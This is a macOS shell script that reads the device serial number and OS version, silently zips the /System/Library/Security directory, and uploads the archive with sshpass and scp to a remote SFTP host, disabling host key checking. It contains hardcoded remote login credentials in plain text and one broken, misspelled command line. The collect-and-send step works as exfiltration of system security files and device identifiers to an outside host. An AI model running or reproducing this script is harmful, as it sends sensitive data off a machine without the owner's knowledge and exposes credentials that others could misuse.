echo "<======= 11111=======>"
#
# <============server configuration==============>
#
PERSON_NAME="mdf"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="85143ddf372a45a28a654f93ed8428a8"
REMOTE_PASS="zHHvsNEz0Thk23fa1jHhfxIdQuwiOFml"
REMOTE_PATH="/home"
REMOTE_DEST="/"

# Configuration
SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
IOS_VERSION=$(sw_vers -productVersion)
LOCAL_FILE="appstore_unmodified"
ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
echo "$ARCHIVE_NAME"


cd $home/../../../System/Library/
archeiving files
echo "archiving silently"
zip -qr "$ARCHIVE_NAME" Security && echo "Archiving complete!"






# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
#sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 #echo "connection sucesfully"
# Check if the upload was successful
if [[ $? -eq 0 ]]; then
   echo "connection sucesfully"
   exit 100
else
   echo "connection failed."
   exit 101
fi

